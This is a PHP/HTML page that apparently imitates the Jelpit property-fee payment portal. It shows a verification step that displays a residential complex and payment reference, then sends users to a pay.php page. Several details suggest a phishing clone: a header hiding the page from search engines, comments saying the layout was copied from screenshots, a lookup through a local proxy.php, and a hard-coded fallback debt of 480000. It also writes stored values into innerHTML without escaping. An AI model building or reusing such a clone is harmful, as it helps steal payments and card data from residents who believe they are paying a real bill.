<?php header('X-Robots-Tag: noindex, nofollow, noarchive'); ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="icon" href="/img/favicon.svg" type="image/svg+xml">
    <link rel="shortcut icon" href="/img/favicon.svg">
    <link rel="apple-touch-icon" href="/img/favicon.svg">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jelpit - Dashboard Completo</title>
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    
<style>
    :root {
        --stepper-margin-top: 21px;
        --stepper-circle-size: 47px;
        --stepper-line-width: 894px;
        --jelpit-purple: #2D165E;
        --jelpit-purple-btn: #4D148C;
        --jelpit-green-light: #90E080;
        --bg-light: #f4f4f4;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
    body { background-color: var(--bg-light); padding-bottom: 0px; }

    /* ════════════════════════════
       HEADER
    ════════════════════════════ */
    .header-container { width: 100%; background-color: var(--jelpit-purple); display: flex; justify-content: center; position: sticky; top: 0; z-index: 1000; }
    .header-content { width: 100%; max-width: 1784px; height: 81px; padding: 0 40px; display: flex; justify-content: space-between; align-items: center; }
    .logo-section .logo-desktop { height: 50px; display: block; }
    .logo-section .logo-mobile { display: none; } 
    .actions-section { display: flex; align-items: center; gap: 25px; }
    .btn-pill { background-color: #D9F9D3; color: var(--jelpit-purple); padding: 1px 7px; border-radius: 50px; text-decoration: none; font-size: 13px; font-weight: 400; display: flex; align-items: center; gap: 8px; height: 42px; }
    .btn-pill svg { width: 16px; height: 16px; stroke: var(--jelpit-purple); stroke-width: 2.5; }
    .btn-box { background-color: #baf2b5; color: var(--jelpit-purple); width: 89px; height: 59px; border-radius: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-decoration: none; text-align: center; font-size: 12px; font-weight: 700; gap: 4px; line-height: 1.1; margin-top: 3px; }
    .icon-circle { border: 1.5px solid var(--jelpit-purple); border-radius: 50%; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; }
    .nav-item { color: white; text-decoration: none; display: flex; flex-direction: column; align-items: center; font-size: 11px; gap: 6px; text-align: center; min-width: 40px; }
    .nav-item svg { width: 22px; height: 22px; stroke: white; fill: none; stroke-width: 1.8; }
    .menu-toggle { display: none; }

    /* ══════════════════════════════════════════════════════════
       BANNER PROMOCIONES (CORREGIDO SEGÚN CAPTURAS)
    ══════════════════════════════════════════════════════════ */
    .promo-swiper { width: 100%; height: 65px; border-bottom: 1px solid #eee; overflow: hidden; }
    .promo-swiper .swiper-slide { display: flex; align-items: center; justify-content: center; gap: 15px; font-size: 15px; font-weight: 500; color: #333; padding: 0 20px; }
    
    /* Colores de fondo por slide */
    .bg-health { background-color: #E6F4F1; } /* Verde muy claro */
    .bg-davivienda { background-color: #F2F2F2; } /* Gris claro */
    .bg-property { background-color: #D1EFFF; } /* Azul muy claro */

    /* Iconos Banner */
    .banner-icon { width: 32px; height: 32px; flex-shrink: 0; }

    /* Botones Banner */
    .btn-promo { padding: 10px 24px; border-radius: 30px; text-decoration: none; font-weight: 700; font-size: 14px; transition: opacity 0.2s; }
    .btn-promo-yellow { background-color: #FFD662; color: #2D165E; }
    .btn-promo-red { background-color: #E03E2D; color: white; }
    .btn-promo-orange { background-color: #FF9D29; color: #2D165E; }

    /* ════════════════════════════
       BARRA ATRÁS
    ════════════════════════════ */
    .back-bar { width: 100%; max-width: 1785px; height: 57px; margin: 0 auto; background-color: white; display: flex; align-items: center; padding: 0 60px; border-bottom: 1px solid #e0e0e0; }
    .back-link { color: var(--jelpit-purple); text-decoration: none; display: flex; align-items: center; gap: 4px; font-size: 14px; }
    .back-link svg { width: 18px; height: 18px; stroke: var(--jelpit-purple); stroke-width: 2.5; }

    /* ════════════════════════════
       STEPPER
    ════════════════════════════ */
    .stepper-wrapper { width: 100%; display: flex; justify-content: center; margin-top: 12px; padding-bottom: 25px; }
    .stepper-content { width: 100%; max-width: var(--stepper-line-width); display: flex; align-items: center; justify-content: space-between; position: relative; }
    .stepper-content::before { content: ""; position: absolute; top: calc(var(--stepper-circle-size) / 2); left: calc(100% / 6); right: calc(100% / 6); height: 2px; background-color: #dbdbdb; }
    .step { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; flex: 1; }
    .step-circle { width: var(--stepper-circle-size); height: var(--stepper-circle-size); background-color: #fff; border: 2px solid #dbdbdb; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .step.completed .step-circle { background-color: #2D165E; border-color: #2D165E; }
    .step.active .step-circle { background-color: var(--jelpit-green-light); border-color: var(--jelpit-green-light); box-shadow: 0 0 0 4px #fff, 0 0 0 6px var(--jelpit-green-light); }
    .step-label { font-size: 14px; color: #999; margin-top: 15px; }
    .step.active .step-label { color: var(--jelpit-purple); font-weight: 800; }

    /* ════════════════════════════
       CONTENEDOR VERIFICACIÓN
    ════════════════════════════ */
    .verify-card {
    width: 1194px;
    height: 430px;
    margin: 12px auto;
    background: white;
    border-radius: 12px;
    padding: 22px 31px;
    border: 1px solid #efefef;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
    position: relative;
    display: flex;
    flex-direction: column;
}
    .verify-card h2 { color: var(--jelpit-purple); font-size: 24px; font-weight: 800; margin-bottom: 6px; }
    .verify-card .subtitle { color: #666; font-size: 15px; margin-bottom: 35px; }
    .section-title { color: var(--jelpit-purple); font-weight: 800; font-size: 14px; margin-bottom: 15px; display: block; }
    .verify-box { position: relative; padding-bottom: 20px; border-bottom: 1px solid #f2f2f2; margin-bottom: 25px; }
    .verify-box:last-of-type { border-bottom: none; margin-bottom: 64px; }
    .data-row { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }
    .data-row svg { width: 18px; height: 18px; color: var(--jelpit-purple); flex-shrink: 0; }
    .text-bold { color: #333; font-weight: 800; font-size: 17px; text-transform: uppercase; }
    .text-regular { color: #555; font-size: 15px; }
    .text-regular b { color: #333; font-weight: 700; }
    .link-change { position: absolute; right: 0; top: 50%; transform: translateY(-50%); color: var(--jelpit-purple); text-decoration: underline; font-weight: 700; font-size: 15px; display: flex; align-items: center; gap: 8px; }
    .link-change svg { width: 18px; height: 18px; stroke-width: 2.5; transform: scaleX(-1); }
.btn-main-green {
    background-color: var(--jelpit-green-light);
    color: var(--jelpit-purple);
    border: none;
    padding: 8px 68px;
    border-radius: 40px;
    font-weight: 550;
    font-size: 17px;
    cursor: pointer;
    display: block;
    margin: -67px auto 0;
}
    /* ══════════════════════════════════════════════════════════
       PAYMENT SECTION
    ══════════════════════════════════════════════════════════ */
    .payment-section { 
        width: 100%; 
        max-width: 1100px; 
        margin: 40px auto; 
        padding: 20px 0; 
        border-top: 1px solid #ddd; 
    }

    .payment-wrapper-inline { 
        display: flex; 
        align-items: center; 
        justify-content: center; 
        gap: 20px; 
    }

    .payment-title {
    color: var(--jelpit-purple);
    font-size: 18px;
    font-weight: 900;
    margin-left: 280px;
    white-space: nowrap;
}

    .payment-swiper { 
        flex: 1; 
        max-width: 700px; 
        overflow: hidden; 
    }

    .payment-swiper .swiper-wrapper { 
        transition-timing-function: linear !important; 
    }

    .pay-item { 
        display: flex; 
        align-items: center; 
        gap: 10px; 
        padding: 0 10px;
    }

    .pay-item img { 
        height: 20px; 
        width: auto; 
    }

    .pay-item span { 
        font-size: 16px; 
        color: #777; 
        font-weight: 500; 
        white-space: nowrap; 
    }

    .legal-text { 
        text-align: center; 
        width: 100%; 
        margin-top: 10px; 
        font-size: 14px; 
        color: #000; 
        font-weight: 400; 
    }

    /* ════════════════════════════
       FOOTER
    ════════════════════════════ */
    .footer-container { background-color: #2D165E; color: white; padding: 40px 0 30px; margin-top: 60px; width: 100%; }
    .footer-content { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
    .social-icons { display: flex; gap: 20px; justify-content: flex-end; margin-bottom: 15px; }
    .social-icons img { filter: brightness(0) invert(1); opacity: 0.8; }
    .footer-divider { border-top: 1px solid rgba(255, 255, 255, 0.15); margin: 20px 0; }
    .footer-middle { display: flex; justify-content: flex-start; gap: 40px; flex-wrap: wrap; font-size: 14px; }
    .footer-links { display: flex; gap: 25px; flex-wrap: wrap; margin-top: 10px; }
    .footer-links a { color: white; font-size: 13px; text-decoration: underline; opacity: 0.9; }

    @media (max-width: 800px) {
        .header-content { height: 75px; padding: 0 15px; }
        .logo-section .logo-desktop { display: none !important; }
        .logo-section .logo-mobile { display: block !important; height: 39px; }
        .btn-pill, .btn-box { display: none !important; }
        .menu-toggle { display: flex !important; flex-direction: column; align-items: center; }
        .verify-card { width: 95%; height: auto; padding: 20px; }
        .payment-wrapper-inline { flex-direction: column; }
        .payment-swiper { max-width: 100%; }
        /* Ajustes para el banner en celular */
    .promo-swiper .swiper-slide {
        flex-direction: row; /* Mantiene icono y texto en línea */
        justify-content: center;
        font-size: 13px; /* Texto un poco más pequeño para que quepa */
        text-align: left;
        padding: 0 10px;
    }

    .promo-swiper .btn-promo {
        background: none !important; /* Quita el fondo de botón */
        color: #0072CE !important; /* Color azul de enlace según tu captura */
        padding: 0 !important;
        margin-left: 5px;
        text-decoration: underline !important; /* Agrega el subrayado */
        font-weight: 700;
        display: inline; /* Se comporta como parte del texto */
    }

    .banner-icon {
        width: 24px; /* Icono más pequeño en móvil */
        height: 24px;
    }
    /* Estilo del Banner solicitado en captura 8.59.13 */
    .promo-swiper .swiper-slide {
        font-size: 13px;
        padding: 0 15px;
    }
    .promo-swiper .btn-promo {
        background: none !important;
        color: #0072CE !important;
        padding: 0 !important;
        margin-left: 5px;
        text-decoration: underline !important;
        font-weight: 700;
        display: inline;
    }

    /* ══════════════════════════════════════════════════════════
       CONTENEDOR CELULAR (Captura 9.02.11)
    ══════════════════════════════════════════════════════════ */
    .verify-card {
        width: 90%;
        height: auto;
        padding: 25px 20px;
        margin: 20px auto;
        text-align: left; /* Títulos alineados a la izquierda */
    }

        .verify-card h2 {
        font-size: 18px;
        line-height: 1.7;
    }

    .verify-card .subtitle {
        font-size: 14px;
        margin-bottom: 25px;
    }

    /* Centrar los botones de cambio en móvil */
    .link-change {
        position: static; /* Quita el posicionamiento absoluto de PC */
        transform: none;
        display: flex;
        justify-content: center; /* Centra el link */
        margin-top: 15px;
        width: 100%;
        font-size: 14px;
    }

    .verify-box {
        padding-bottom: 15px;
        margin-bottom: 20px;
    }

    /* Ajustar el botón continuar al ancho del diseño móvil */
    .btn-main-green {
        width: 100%;
        max-width: 280px;
        margin: 20px auto 0;
        padding: 14px;
    }

    /* Medios de pago en móvil */
    .payment-wrapper-inline {
        flex-direction: column;
        padding-left: 0;
        gap: 10px;
    }
    .payment-title {
        margin-left: 0;
        font-size: 18px;
    }
    }
</style>
</head>
<body>

   <header class="header-container">
        <div class="header-content">
            <div class="logo-section">
                <img src="img/logo.svg" alt="Jelpit" class="logo-desktop">
                <img src="img/c.svg" alt="Jelpit" class="logo-mobile">
            </div>
            <div class="actions-section">
                <a href="#" class="btn-pill">Conjuntos <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M6 9l6 6 6-6"></path></svg></a>
                <a href="#" class="btn-box"><div class="icon-circle">$</div><span>Pagar<br>administración</span></a>
                <a href="#" class="nav-item">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                    <span>Iniciar sesión</span>
                </a>
                <a href="#" class="nav-item">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg>
                    <span>Carrito</span>
                </a>
                <div class="nav-item menu-toggle">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                    <span>Menú</span>
                </div>
            </div>
        </div>
    </header>

    <!-- BANNER PROMOCIONES ACTUALIZADO -->
    <div class="swiper promo-swiper">
        <div class="swiper-wrapper">
            <!-- Slide Salud -->
            <div class="swiper-slide bg-health">
                <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="#006847" stroke-width="2">
                    <path d="M4.5 7C4.5 4.5 6.5 2.5 9 2.5s4.5 2 4.5 4.5M10.5 7h3M19.5 7c0-2.5-2-4.5-4.5-4.5S10.5 4.5 10.5 7M10.5 7h3M12 7v14.5M7 16.5c0 2.8 2.2 5 5 5s5-2.2 5-5"/>
                    <circle cx="12" cy="7" r="1" fill="#006847"/>
                </svg>
                <span>Seguro de Salud a su Medida desde <b>$41.500</b> mensuales para usted y su familia.</span>
                <a href="#" class="btn-promo btn-promo-yellow">Compre ahora</a>
            </div>
            <!-- Slide Davivienda -->
            <div class="swiper-slide bg-davivienda">
                <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="#E03E2D" stroke-width="2">
                    <rect x="3" y="8" width="18" height="12" rx="2"/>
                    <path d="M12 8V4M8 4h8M7 12h10M12 12v4"/>
                    <path d="M3 12h18" stroke-dasharray="2 2"/>
                </svg>
                <span>Disfrute de sus servicios GRATIS por tener tarjeta de crédito Davivienda. ❤️💳</span>
                <a href="#" class="btn-promo btn-promo-red">¡Úselos aquí!</a>
            </div>
            <!-- Slide Inmueble -->
            <div class="swiper-slide bg-property">
                <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="#0072CE" stroke-width="2">
                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V9z"/>
                    <polyline points="9 22 9 12 15 12 15 22"/>
                </svg>
                <span>Calcula gratis y en línea el valor de tu inmueble, para venderlo o arrendarlo.</span>
                <a href="#" class="btn-promo btn-promo-orange">¡Calcular precio!</a>
            </div>
        </div>
    </div>

    <div class="back-bar">
    <a href="index.php" class="back-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path d="M15 18l-6-6 6-6"></path>
        </svg>
        Atrás
    </a>
</div>

<div class="stepper-wrapper">
    <div class="stepper-content">

        <div class="step completed">
            <div class="step-circle">
                <svg viewBox="0 0 24 24" width="18" height="18" stroke="#90E080" stroke-width="3" fill="none">
                    <path d="M20 6L9 17l-5-5"></path>
                </svg>
            </div>
            <div class="step-label">Buscar</div>
        </div>

        <div class="step active">
            <div class="step-circle">2</div>
            <div class="step-label">Verificar</div>
        </div>

        <div class="step">
            <div class="step-circle">3</div>
            <div class="step-label">Pagar</div>
        </div>

    </div>
</div>

<div class="verify-card">

    <h2>Verifica la copropiedad y referencia</h2>

    <p class="subtitle">
        Revisa y confirma que la información sea correcta para el pago
    </p>

    <span class="section-title">
        Copropiedad: Propiedad horizontal
    </span>

    <!-- ===================================== -->
    <!-- COPROPIEDAD -->
    <!-- ===================================== -->
    <div class="verify-box">

        <div class="data-row">

            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="4" y="2" width="16" height="20" rx="2"/>
                <line x1="8" y1="6" x2="8" y2="6.01"/>
                <line x1="12" y1="6" x2="12" y2="6.01"/>
                <line x1="16" y1="6" x2="16" y2="6.01"/>
            </svg>

            <span
                class="text-bold"
                id="nombre-conjunto"
            >
                Cargando...
            </span>

        </div>

        <div class="data-row">

            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
                <circle cx="12" cy="10" r="3"/>
            </svg>

            <span
                class="text-regular"
                id="direccion-conjunto"
            >
                Cargando...
            </span>

        </div>

        <div class="data-row">

            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="4" width="18" height="16" rx="2"/>
                <path d="M7 8h10M7 12h10M7 16h10"/>
            </svg>

            <span
                class="text-regular"
                id="convenio-conjunto"
            >
                Convenio: <b>000000</b>
            </span>

        </div>

        <a href="index.php" class="link-change">

            <svg viewBox="0 0 24 24"
                 fill="none"
                 stroke="currentColor"
                 stroke-width="2.5"
                 stroke-linecap="round"
                 stroke-linejoin="round">

                <path d="M21 12a9 9 0 1 1-9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/>
                <path d="M21 3v5h-5"/>

            </svg>

            Cambiar copropiedad

        </a>

    </div>

    <!-- ===================================== -->
    <!-- REFERENCIA -->
    <!-- ===================================== -->
    <span class="section-title">
        Referencia de pago
    </span>

    <div class="verify-box">

        <div class="data-row">

            <span
                class="text-regular"
                id="inmueble-texto"
            >
                Inmueble : <b>APARTAMENTO</b>
            </span>

        </div>

        <div class="data-row">

            <span
                class="text-regular"
                id="referencia-texto"
            >
                Referencia : <b>0000</b>
            </span>

        </div>

        <a href="index.php" class="link-change">

            <svg viewBox="0 0 24 24"
                 fill="none"
                 stroke="currentColor"
                 stroke-width="2.5"
                 stroke-linecap="round"
                 stroke-linejoin="round">

                <path d="M21 12a9 9 0 1 1-9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/>
                <path d="M21 3v5h-5"/>

            </svg>

            Cambiar referencia

        </a>

    </div>

    <!-- ===================================== -->
    <!-- BOTON -->
    <!-- ===================================== -->
    <button
        class="btn-main-green"
        id="btn-continuar"
    >
        Continuar
    </button>

</div>

    <div class="payment-section">
        <div class="payment-wrapper-inline">
            <div class="payment-title">Medios de pago</div>
            <div class="swiper payment-swiper">
                <div class="swiper-wrapper">
                    <div class="swiper-slide"><div class="pay-item"><img src="https://d3dx4avr8x17qs.cloudfront.net/administration-fee/img/icons/credit-card/image_2.png"><span>Tarjeta crédito</span></div></div>
                    <div class="swiper-slide"><div class="pay-item"><img src="https://d3dx4avr8x17qs.cloudfront.net/administration-fee/img/icons/credit-card/image_2.png"><span>Tarjeta débito</span></div></div>
                    <div class="swiper-slide"><div class="pay-item"><img src="https://d3dx4avr8x17qs.cloudfront.net/administration-fee/img/icons/pse/image_1.png"><span>PSE</span></div></div>
                    <div class="swiper-slide"><div class="pay-item"><img src="https://d3dx4avr8x17qs.cloudfront.net/administration-fee/img/icons/davivienda/Group.png"><span>Daviplata</span></div></div>
                </div>
            </div>
        </div>
        <div class="legal-text">*Disponibilidad sujeta a condiciones contratadas por el conjunto.</div>
    </div>

    <footer class="footer-container">
        <div class="footer-content">
            <div class="social-icons"><a href="#"><img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="20" alt="IG"></a><a href="#"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="20" alt="FB"></a></div>
            <div class="footer-divider"></div>
            <div class="footer-middle"><span>📞 601 3905331</span><span>✉️ lineadesoporte923@serviciosbolivar.com</span></div>
            <div class="footer-links"><a href="#">Términos y Condiciones</a><a href="#">Políticas de Privacidad</a></div>
            <div style="margin-top: 20px; opacity: 0.7; font-size: 12px; text-align: center;">© 2026 Jelpit.</div>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
 <script>

    // =========================================
    // SWIPERS
    // =========================================
    const promoSwiper = new Swiper('.promo-swiper', {
        loop: true,
        autoplay: {
            delay: 4000,
            disableOnInteraction: false
        }
    });

    const paymentSwiper = new Swiper('.payment-swiper', {
        loop: true,
        slidesPerView: 'auto',
        speed: 5000,
        autoplay: {
            delay: 0,
            disableOnInteraction: false
        },
        freeMode: true
    });

    // =========================================
    // LEER LOCAL STORAGE
    // =========================================
    const datosLocal = localStorage.getItem('datosapi');

    // SI NO EXISTE -> VOLVER
    if (!datosLocal) {

        window.location.href = 'index.php';

    }

    // =========================================
    // PARSEAR DATOS
    // =========================================
    const datosapi = JSON.parse(datosLocal);

    // VALIDAR
    if (
        !datosapi.conjuntoSeleccionado ||
        !datosapi.propiedadSeleccionada
    ) {

        window.location.href = 'index.php';

    }

    // =========================================
    // OBJETOS
    // =========================================
    const conjunto = datosapi.conjuntoSeleccionado;
    const propiedad = datosapi.propiedadSeleccionada;

    console.log("DATOS LOCALES:", datosapi);

    // =========================================
    // REEMPLAZAR DATOS
    // =========================================

    // NOMBRE
    document.getElementById(
        'nombre-conjunto'
    ).innerText =
        conjunto.co_ownership_name || '';

    // DIRECCION
    document.getElementById(
        'direccion-conjunto'
    ).innerText =
        `${conjunto.address || ''}, ${conjunto.city || ''} - ${conjunto.department || ''}`;

    // CONVENIO
    document.getElementById(
        'convenio-conjunto'
    ).innerHTML =
        `Convenio: <b>${conjunto.agreement_number || ''}</b>`;

    // INMUEBLE
    document.getElementById(
        'inmueble-texto'
    ).innerHTML =
        `Inmueble : <b>${propiedad.property_type || 'APARTAMENTO'} ${propiedad.property_number || ''}</b>`;

    // REFERENCIA
    document.getElementById(
        'referencia-texto'
    ).innerHTML =
        `Referencia : <b>${propiedad.reference || ''}</b>`;

    // =========================================
// BOTON CONTINUAR
// =========================================
const btnContinuar = document.getElementById('btn-continuar');

btnContinuar.addEventListener('click', async function () {

    const datosGuardados = localStorage.getItem('datosapi');
    if (!datosGuardados) {
        window.location.href = 'index.php';
        return;
    }

    // ── Mostrar loader ──────────────────────────────────────────
    const loader = document.createElement('div');
    loader.id = 'loader-overlay';
    loader.innerHTML = `
        <div style="
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55);
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            z-index: 9999;
        ">
            <div style="
                width: 52px; height: 52px;
                border: 5px solid rgba(255,255,255,0.3);
                border-top-color: #ffffff;
                border-radius: 50%;
                animation: spin 0.8s linear infinite;
            "></div>
            <p style="color:#fff; margin-top:16px; font-size:15px; font-family:sans-serif;">
                Consultando deuda...
            </p>
        </div>
        <style>
            @keyframes spin { to { transform: rotate(360deg); } }
        </style>
    `;
    document.body.appendChild(loader);
    btnContinuar.disabled = true;

    // ── Llamar al endpoint ──────────────────────────────────────
    try {
        const datos = JSON.parse(datosGuardados);
        const nombreConjunto = datos.conjuntoSeleccionado?.co_ownership_name || '';
        const conjuntoId     = datos.conjuntoSeleccionado?.parent_co_ownership_id || datos.conjuntoSeleccionado?._id || '';
        const apto           = datos.propiedadSeleccionada?.property_number   || '';
        const referencia     = datos.propiedadSeleccionada?.reference         || '';

        const url = `proxy.php?accion=consultar-deuda&nombre_conjunto=${encodeURIComponent(nombreConjunto)}&conjuntoId=${encodeURIComponent(conjuntoId)}&apto=${encodeURIComponent(apto)}&referencia=${encodeURIComponent(referencia)}`;

        const res  = await fetch(url);
        const data = await res.json();

        if (data.error) {
            throw new Error(data.message || data.error);
        }

        // ── Guardar resultado y redirigir ───────────────────────
        datos.deudaConsultada = data;          // guarda todo el objeto
        datos.total           = data.deuda_total || data.total || 480000; // acceso rápido al total
        localStorage.setItem('datosapi', JSON.stringify(datos));

        window.location.href = 'pay.php';

    } catch (err) {
        document.body.removeChild(loader);
        btnContinuar.disabled = false;
        alert('Error al consultar la deuda: ' + err.message);
    }

});
</script>
</body>
</html>